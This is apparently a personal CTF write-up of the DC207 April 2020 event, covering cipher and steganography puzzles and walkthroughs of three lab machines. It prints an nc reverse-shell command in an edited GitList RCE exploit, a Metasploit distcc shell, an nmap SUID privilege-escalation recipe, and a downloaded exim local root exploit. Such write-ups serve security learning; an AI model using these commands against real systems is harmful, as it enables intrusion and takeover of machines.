---
title: "DC207 CTF - April 2020"
date: 2020-05-11T12:30:10Z
draft: true
tags: ["notes", "ctf", "dc207"]
---

## Walkthrough

Walkthrough of a CTF hosted by [DC207](https://dc207.org) back in April 2020. It was a blast and I won!

### Fun Fun Fun Fun

#### #1 If only it were that easy

Solve the puzzle for the solution:

`yetz{lhfxpaxkxhoxkmaxvbiaxk}`

It's a caesar cipher! ROT[ate]7!

`flag{somewhereoverthecipher}`

#### #2 Horse Meatballs

Attached is the clue. Decode the message, the flag is the name of the source of the content:

notavirus.wav

Hmm, well, since it's not a virus I downloaded the file and opened it. After collecting my computer parts and reassembling it after I threw it out the window in my haste to disconnect it from my network, I realized the beeping noises were *gasp*, MORSE COOOOooode. Using [morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html), you can upload morse code files for decoding. Or, if you're spooked and would rather not upload things, they have a microphone option, so you can make beepbeep noises with ur mouth.

<morseCode.png>

It was pretty easy to see that it was the lyrics to an Abba song. After having a small fit that my answers weren't working, my boy Outrun said, 'read the question again, ya idiot' and I realized the flag was... the source, yeah, Abba... not the lyrics.

`flag{Abba}`

#### #3 I can use google too!

Who is the hosting company for DC207 website? The flag will be in the format of flag{NAMEOFCO}. Happy hunting.

This one was actually pretty challenging, I didn't use google to find it, the Goog / whois / dig produced a bunch of answers, Amazon EC2, AWS, Acquious Hosting (???), Namecheap, etc. Alas, I was unable to locate the hosting provider via Google. Frustrated at my lack of googlefu, I turned to Burp.

I typically proxy all my traffic through Burp Suite if I'm trying to do anything... techy? I guess? As I'm writing this though, I realized you could probably just use dev tools? Hidden in plain sight, the answer is simply in the site headers.

`flag{Site123}`

#### #4 I can use google two!

What company is hosting this website? Format of flag will be flag{THISCOMPANY}. Good luck.

This one, a quick google revealed.

`flag{Digital Ocean}`

#### #5 There's another flag there in the first part. Can you find it?

Hey, I thought I got that one! Well, he said it's hidden... so I guess let's look at the file? You could do this a number of ways, likely easiest is just to look at the file's properties.

`flag{itrancendgenre}`

#### #6 Um, I always read my e-mail

Well, do you?

Well, I woulda, I swear it! But you see-- I never actually RECEIVED the email about the CTF... Again, friends to the rescue, Outrun forwarded it to me.

#### #7 ZOMG!

It's amazing how cute they are, isn't?

Yeah, pretty cute, but like what? Well, so far we've already had something hidden IN a file, usually with picture's it's some form of steganography. This site proved useful: https://stylesuxx.github.io/steganography/

`flag{omgsocuterite}`

#### #8 Open the file

So um, we're going to need you to open this file.

flagisinhere.zip

This one is fairly straightforward, run zip2john to obtain a hash, and run JTR against it. I couldn't imagine a CTF such as this would have hard cracking requirements, and as expected it cracked super duper fast.

<zip2john.png>

`flag{cheater}`

#### #9 Wait, whois this?

There's something weird about DC207.org's DNS. Can you find it?

I really dig it when people include DNS challenges. Get it?

dig txt dc207.org

`flag{nicefind}`

#### #10 Code Commode

My code is shit, check out DC207.org for where it's really bad. Can you find the flag?

Yup, totally can, you left it right in the source!

`flag{thisisaflag}`

#### #11 I don't subscribe to that

What is the name of the country which was demoed in //dug0ut's recently published article? Solution will be in the format of flag{countryname}. Best of luck. :-)

Crap, yeah, I actually DON'T subscribe to that. So this one was a bit tricky, as we found out that it was from a 2600 zine. That's fine, but when we grabbed the most recent version, as it turns out it came out that same day. //dug0ut's article was not present unfortunately. So, I did the only thing a sane person would: download different wordlists of every country in the world that's ever existed or exists, sort -u them and use a bash loop and curl to slam them at the site until I got it. After a few attempts, it didn't appear to be working, so I added a big delay between requests. That seems to have fixed it.

`flag{Belize}`

#### #12 I'm down with the CCC

Solve this puzzle.

Yikes, this one was hard. Well, it was tricky. Sorry to all you chaps who decoded the message [BE SURE TO DRINK YOUR OVALTINE], oh wait that's not it, [CABLE SALAD IS GOOD FOR YOU]. Hell, I didn't even solve it, I started writing a bruteforcer to solve it for me when I decided to just run steghide against the picture. It prompted me for the password, but like a good little hacker I just hit enter instead. To my excitement, it actually spit a file out! 

<stegSnow1.png>

At this point I was certain I had it, the contents of the file looked, again, like it was a caesar cipher. I rotated 7 and found that viola, it's the Fla--..irst paragraph of the wikipedia article on Caesar Ciphers... wooo! Fuck. The other thing you notice when you open that file is that there's a ton of whitespace. Five linebreaks after the last sentence. xxd gave me a clue, though.

<xxd.png>

Definitely fishy. I tried a whole lotta things-- first I started with morse code, coonverting tabs and spaces to dashes and dots and vice versa proved trying and fruitless. Also, trying to decipher morse without any spaces is... not a lot of fun. There are bruteforcers out there, but it was too much. At this point my worst fears became a temporary reality. I was certain it was whitespace(https://en.wikipedia.org/wiki/Whitespace_(programming_language)). I quickly found that I wasn't able to compile it, somewhere in the program, "there must be a rogue space... or tab..."" he whimpered.

Anyway, after debugging whitespace for a while I found the application (as is) is pushing some ASCII values onto the stack. Or, well, it WOULD be if it was a WS program. Turned out to be pure coincidence. I got the bright idea to finally google 'Whitespace encoding' and found stegsnow((https://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html)).

`flag{youfounditnicejerb}`

## Escalation Station
```
┌[~]
└⇾ root $ nmap -sV -p0- 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 22:31 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.000087s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.0.8 or later
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:AE:ED:6B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First flag can be foudn in the metadata of the image1.png file:
```
┌[~/CTFs/DC207]
└⇾ root $ exiftool image1.png 
ExifTool Version Number         : 11.93
File Name                       : image1.png
...
XMP Toolkit                     : Image::ExifTool 9.27
Title                           : flag{triaxialityuncanninessesCamberwelldictyosomesclothed}
...
Megapixels                      : 0.262
```

The second flag is in QR code, image2.png
`flag{thranganalogouslyunstrippedgauzinessesskerries}`

The third flag is in the officiis.docx file. file tells us it's ASCII text, and cat'ing it out reveals two lists of the same hashes. Looking closer, there's a hash that's not present in both lists:

```
┌[~/CTFs/DC207]
└⇾ root $ cat officiis.docx 
c621038f7cf17e30ebaaa700a28e55c70199e62b
cf94438c8e8668a82bbd207a69d18b4e63448df6
0692f9b6809d38e297da9f4393fa76c75e52b64e
1a5e481b0a524d2b5d33236d41cde5e96b750283
720bb8b2cb44edbb84e6f0dca2cf458fae8a98a4
64447ceb593f54e66881757206eb851892b7ca8c
aeb166c7baef60b503d0ea6a9b313151c96f1e14
716dd2a1d67b8dc6f2be2979e295890a0d31e6e3
3f8f465f140e77817ea970cd888dae2534d043a6
666c61677b62626366353864337de88e1f1914c8
de3ee007bc474ac3a3c5feea9785eaec8108d5d3
f2af04be6a196fbd540554042e908fe309adee63
fbf214d9789bd029b29717280145f9c8d5cf0f4d
39d7e27901bf3704aa07adbb37d93d2bb7ff0c1a
254a634e71f4947a596702bf74198eb0152a8f22
bb0c0226ba01a828b3e5755876cbca2ec611b5c4
1810936a71d498872b9c518c1344aae6a9847942
a75c553abf99adb1ad7c75857e2eea783f41ffea
92e03d9815d47580154b9c9f66d5463ea0f646fd
8c96e916143fc549bb6dbcd0f5c3c92a6ce4d21f
b817a68aea42bb02c6e5ca0559ece9e841707547

------
aeb166c7baef60b503d0ea6a9b313151c96f1e14
c621038f7cf17e30ebaaa700a28e55c70199e62b
de3ee007bc474ac3a3c5feea9785eaec8108d5d3
92e03d9815d47580154b9c9f66d5463ea0f646fd
254a634e71f4947a596702bf74198eb0152a8f22
0692f9b6809d38e297da9f4393fa76c75e52b64e
b817a68aea42bb02c6e5ca0559ece9e841707547
1810936a71d498872b9c518c1344aae6a9847942
8c96e916143fc549bb6dbcd0f5c3c92a6ce4d21f
cf94438c8e8668a82bbd207a69d18b4e63448df6
39d7e27901bf3704aa07adbb37d93d2bb7ff0c1a
720bb8b2cb44edbb84e6f0dca2cf458fae8a98a4
3f8f465f140e77817ea970cd888dae2534d043a6
1a5e481b0a524d2b5d33236d41cde5e96b750283
bb0c0226ba01a828b3e5755876cbca2ec611b5c4
64447ceb593f54e66881757206eb851892b7ca8c
fbf214d9789bd029b29717280145f9c8d5cf0f4d
716dd2a1d67b8dc6f2be2979e295890a0d31e6e3
a75c553abf99adb1ad7c75857e2eea783f41ffea
f2af04be6a196fbd540554042e908fe309adee63
```

Sorting the list of hashes makes it easier to see: `666c61677b62626366353864337de88e1f1914c8`

The first half of that hash is the flag, encoded in hex:
`flag{bbcf58d3}`

The next flags can't be obtained without getting a shell on the machine. A quick google search reveals gitlist has multiple RCE vulnerabilities. We cna use the following exploit:

https://www.exploit-db.com/exploits/44548

Editing the IPs and command to:
```
url = 'http://192.168.56.101/'
command = 'nc -e /bin/sh 192.168.56.104 8081' # nc reverse shell
your_ip = '192.168.56.104'
your_port = 8001
```

Set up a netcat lsitener and run the exploit

Exploit:
```
┌[~/CTFs/DC207]
└⇾ root $ python /pentest/gitList-RCE.py 
GitList 0.6 Unauthenticated RCE
by Kacper Szurek
https://security.szurek.pl/
REMEMBER TO DISABLE FIREWALL
[+] Found repo secret_files
[+] Found file image1.png
����JFIF��
          |http://ns.adobe.com/xap/1.0/<?xpacket begin='���' id='W5M0MpCehiHzreSzNTczk
[+] Search using http://192.168.56.101/secret_files/tree/c/search
[+] Start server on 192.168.56.103:8001
[+] Server started
```

Listener:
```
┌[~]
└⇾ root $ nc -lvp 8081
listening on [any] 8081 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.101] 59178
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We get the next flag from a file in a directory one up from our pwd
```
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@debian-9:/home/git/repositories$ cd ../
cd ../
www-data@debian-9:/home/git$ ls -al
ls -al
total 16
drwxr-xr-x 3 www-data www-data 4096 Apr 13 14:43 .
drwxr-xr-x 5 root     root     4096 Apr 13 14:43 ..
-rwxr-x--- 1 www-data root       15 Apr 13 14:43 earum.xlsx
drwxr-xr-x 3 www-data root     4096 Apr 13 14:43 repositories
www-data@debian-9:/home/git$ cat earum.xlsx
cat earum.xlsx
flag{cf6f9a63}
www-data@debian-9:/home/git$
```

The last flag is in /root/ so we need to escalate to get it. After running linuxprivescchecker on the machine I saw that the suid bit on nmap was set:

`-rwsr-xr-x 1 root root 2838168 Dec 22  2016 /usr/bin/nmap`

Normally, we'd be able to use the --interactive flag on nmap to drop into a shell with root privs, but this is nmap 7.4, so you'll  see the following if you try:
```
www-data@debian-9:/home/git/repositories/secret_files$ nmap --interactive
nmap --interactive
nmap: unrecognized option '--interactive'
See the output of nmap -h for a summary of options.
```

However, nmap can run user scripts, so it's possible to use nmap to execute commands, and because of the SUID bit, as a privileged user. We can use the following nmap privesc (https://gtfobins.github.io/gtfobins/nmap/)
```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

cat /root/dolor.wav
flag{hisserMacassaresecyclospermousanthomaniacoutgrosses}
```

## WildOut

For me, Wildout started similarly to Esclation Station-- a port scan showed quite a few open ports, but my first inkling was to go after http. Here's the nmap output: 
```
┌[~]
└⇾ root $ nmap -sV -p0- 192.168.56.102
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 19:24 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.102
Host is up (0.000069s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
110/tcp   open  pop3     Openwall popa3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
3632/tcp  open  distccd  distccd v1 ((Debian 6.3.0-18+deb9u1) 6.3.0 20170516)
36355/tcp open  mountd   1-3 (RPC #100005)
38939/tcp open  mountd   1-3 (RPC #100005)
44603/tcp open  nlockmgr 1-4 (RPC #100021)
49665/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:BE:19:8F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A few things stick out right away. First, http probably has *something* on it, second, pop3, nfs and distcc are certainly not default, with the latter two an explicit no.

Turns out gitlist is running on 80 and there's a 'secret_files' directory; within it, a not so excel-ish aut.xls document. Pulling that down:
```
┌[~/CTFs/DC207]
└⇾ root $ curl -o aut.xls http://192.168.56.102/secret_files/raw/master/aut.xls
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    65    0    65    0     0   2954      0 --:--:-- --:--:-- --:--:--  2954
┌[~/CTFs/DC207]
└⇾ root $ file aut.xls 
aut.xls: ASCII text
┌[~/CTFs/DC207]
└⇾ root $ cat aut.xls 
ZmxhZ3tvYmJsaWdhdG9taXNsaWdodGVkYWxsYXlpbmdzbXp1bmd1c251cnNlcnl9
┌[~/CTFs/DC207]
└⇾ root $ cat aut.xls | base64 -d
flag{obbligatomislightedallayingsmzungusnursery}
```

After looking around a bit more and finding no flags in page sources, headers, etc, I moved on. Next up is nfs:
```
┌[~/CTFs/DC207]
└⇾ root $ showmount -e 192.168.56.102
Export list for 192.168.56.102:
/exports *
┌[~/CTFs/DC207]
└⇾ root $ mount 192.168.56.102:/exports /mnt
┌[~/CTFs/DC207]
└⇾ root $ ls /mnt/
dicta.pages  image1.png  image2.png  image3.png  voluptatibus.doc
```

There's a single nfs share, /exports, which we can mount. Within it are several files, a 'dicta.pages' and 'voluptatibus.doc' file stumped me for a bit-- I'd later learn that they were created my SecGen when the CTF was being designed. There were also three images, each containing a flag:

image1.png: a QR code
`flag{Diflucans offloading}`

image2.png: in exftool output
```
┌[/mnt]
└⇾ root $ exiftool image2.png 
ExifTool Version Number         : 11.93
File Name                       : image2.png
...
Y Resolution                    : 1
Comment                         : flag{9c9ab20e}
Image Width                     : 512
...
Megapixels                      : 0.262

image3.png: exiftool output

┌[/mnt]
└⇾ root $ exiftool image3.png 
ExifTool Version Number         : 11.93
File Name                       : image3.png
...
XMP Toolkit                     : Image::ExifTool 9.27
Title                           : flag{shaft ouabains}
Image Width                     : 512
...
Megapixels                      : 0.262
```

After poking at the SecGen files, I moved back to enumerating. Metasploit had a module for distccd so I tried it and got a shell.
```
msf5 > use exploit/unix/misc/distcc_exec
msf5 exploit(unix/misc/distcc_exec) > show options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   3632             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
msf5 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 192.168.56.103:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo r7cApZJB5IKNddg4;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "r7cApZJB5IKNddg4\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.56.103:4444 -> 192.168.56.102:48280) at 2020-04-28 19:44:23 -0400

id
uid=112(distccd) gid=65534(nogroup) groups=65534(nogroup)
uname -a
Linux debian-9 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) x86_64 GNU/Linux
```

I popped into an interactive shell with pty and found the next two flags in the distccd users' directory:
```
python -c 'import pty; pty.spawn("/bin/bash")'
distccd@debian-9:~$ ls
ls
aut.webm  quaerat.ods
distccd@debian-9:~$ cat aut.webm
cat aut.webm
flag{a3407994}
distccd@debian-9:~$ cat quaerat.ods
cat quaerat.ods
132155170150132063163062115124115062116172143170132110060075
```

The quaerat.ods file was octal encoded, base64'd ascii. Side ntoe, if you don't know any regex, you should really learn some. It's one of those things that takes a little bit of getting the hang of, and in the beginning seems like you're writing heiroglyphics, but once you're proficient with it, it just makes your life so much easier. All the time, seriously. The reason I mention anything is because octal is expected to be in groups of three, and some tools don't account for when it's not. Instead of hand counting one two three- space, one two three, etc, a regex can grab each set of three chars with ([0-9]{3}), then just replace with the match and a space.

Anyway, after base64 decoding, it's `flag{6136771d}`

A directory up and a few down, another flag: 
```
distccd@debian-9:~$ cat ../challenges/elusive/.hush_hush
flag{bu4E4xhzft8lGt5sD8T9VQ}
```
If you didn't know, a '.' character in the front of a filename on a linux system acts to 'hide' the file. A normal ls won't see it, give it the -a switch.

As a side note, it's also possible to RCE gitlist again to obtain another shell. Some might have done that first, which will get you the .hush_hush flag earlier, you'll need to exploit distccd anyway to get it's flags.

The last flag is also in another home directory, for the user 'git':
```
distccd@debian-9:~$ cat /home/git/hush_hush
flag{aposematicallyaptitudeTiltonsvilleBullvilleurus}
```

Obviously we're out for blood though, and we gotta get root. I loaded linuxprivesc check onto the machine and ran it, but didn't find anything that would immediately launch me to root. I looked at running processes, services, all the normal enumeration one does. The only odd thing I noticed was the machine was running exim and pop. I remember thinking that was odd for a CTF, and must mean something, but it wasn't for another hour or so when I googled debian 9 exploit where I found a local priv esc for exim4, from 2019 (https://techblog.mediaservice.net/2019/06/cve-2019-10149-exploit-local-privilege-escalation-on-debian-gnu-linux-via-exim/). I figured this must be it, ran it, and dropped to a shell.
```
distccd@debian-9:/tmp$ curl -o exim4_raptor.sh http://192.168.56.103:8081/exim4_raptor.sh
<aptor.sh http://192.168.56.103:8081/exim4_raptor.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3557  100  3557    0     0   745k      0 --:--:-- --:--:-- --:--:--  868k
distccd@debian-9:/tmp$ chmod +x exim4_raptor.sh
chmod +x exim4_raptor.sh
distccd@debian-9:/tmp$ ./exim4_raptor.sh
./exim4_raptor.sh

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Preparing setuid shell helper...

Delivering setuid payload...
220 debian-9.0.0-amd64 ESMTP Exim 4.89 Wed, 29 Apr 2020 00:10:20 +0000
250 debian-9.0.0-amd64 Hello localhost [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1jTaIu-0000cq-3Q
221 debian-9.0.0-amd64 closing connection

Waiting 5 seconds...
-rwsr-xr-x 1 root nogroup 8744 Apr 29 00:10 /tmp/pwned
# id
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

## Decoder

So the first thing to do is a quick nmap:
```
┌[~]
└⇾ root $ nmap -T5 192.168.138.128/25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 17:20 EDT
Nmap scan report for 192.168.138.135
Host is up (0.000092s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
MAC Address: 00:0C:29:1C:F6:83 (VMware)

Nmap scan report for 192.168.138.254
Host is up (0.00044s latency).
All 1000 scanned ports on 192.168.138.254 are filtered
MAC Address: 00:50:56:FA:B8:27 (VMware)
```

Looks like decoder lives at 135. Immediately, 2049/tcp stands out. NFS is commonly seen, and less commonly secured, so I use showmount to list the shares:
```
┌[~]
└⇾ root $ showmount -e 192.168.138.135
Export list for 192.168.138.135:
/files *
```
As expected, a good sign for us. Mounting the NFS share yields the following:
```
┌[~]
└⇾ root $ showmount -e 192.168.138.135
Export list for 192.168.138.135:
/files *
┌[~]
└⇾ root $ mount 192.168.138.135:/files /mnt
┌[~]
└⇾ root $ ls -al /mnt
total 16
drwxr-xr-x  2 root root 4096 Apr 13 10:34 .
drwxr-xr-x 26 root root 4096 Aug 13  2018 ..
-rw-rw-rw-  1 root root   82 Apr 13 10:34 et.odp
-rw-rw-rw-  1 root root  490 Apr 13 10:34 nisi.avi
```

We've got some... interesting files in here? But are they what they seem?
```
┌[/mnt]
└⇾ root $ file *
et.odp:   ASCII text
nisi.avi: UTF-8 Unicode text
```

'file' tells us that these are probably not what they seem-- .avi files don't typically contain only text.
```
┌[/mnt]
└⇾ root $ cat et.odp 
146154141147173127131131116101103115061130123165070171132066067157171151157147175
┌[/mnt]
└⇾ root $ cat nisi.avi 
flag{9e18caaf}

------
ZmxhZ3t1bnRob3VnaHRmdWxuZXNzQ2hpYmNoYW5leGNyZXRhbHBlcGx1bWVkbm96emxlfQ==

------
102108097103123115104097119108101100032112115097108109105099125

------
,2'-AUVT*XW\TC

------
0110011001101100011000010110011101111011001100110110001000110110011001100011000001100110001100000011000101111101

------
⠋⠇⠁⠛{⠑⠁⠼⠓⠼⠋⠼⠙⠼⠛⠑⠋}

------
GGTTGCCGATTT{GAGAGAAGGCGAGAGAGGGCATTGTTAGAGGCGCGAGGTACTACACCAGTTTTGCGAAGGTAGGAGGGCGCAACAACTTAGGCGAGGGCAGGCACA}
```

Well! That's a lotta stuff. A lot of it is recognizable though and from the name of the machine, 'Decoder', it's not a far reach to say that these are probably all, well.. encoded. It took a bit, but here they all are decoded.
```
cat et.odp 
146154141147173127131131116101103115061130123165070171132066067157171151157147175
```
et.odp contains the flag, encoded in the octal scheme: flag{WYYNACM1XSu8yZ67oyiog}

nisi.avi contains a number of flags, the first obviously being plaintext.
```
flag{9e18caaf} duh

Base64: ZmxhZ3t1bnRob3VnaHRmdWxuZXNzQ2hpYmNoYW5leGNyZXRhbHBlcGx1bWVkbm96emxlfQ==
    flag{unthoughtfulnessChibchanexcretalpeplumednozzle}

Decimal (split every third char): 102108097103123115104097119108101100032112115097108109105099125
    flag{shawled psalmic}

ASCII Shift+102: ,2'-AUVT*XW\TC
    FLAG[opnDrqvn]

Binary: 0110011001101100011000010110011101111011001100110110001000110110011001100011000001100110001100000011000101111101
    flag{3b6f0f01}

Braille: ⠋⠇⠁⠛{⠑⠁⠼⠓⠼⠋⠼⠙⠼⠛⠑⠋}
    flag{ea8647ef}

DNA: GGTTGCCGATTT{GAGAGAAGGCGAGAGAGGGCATTGTTAGAGGCGCGAGGTACTACACCAGTTTTGCGAAGGTAGGAGGGCGCAACAACTTAGGCGAGGGCAGGCACA}
    flag{458A483D649AF07BCDA824E3702983E7}

    https://github.com/ctfs/write-ups-2016/tree/master/qiwi-infosec-ctf-2016/crypto/3-100
```

That's it for decoder!
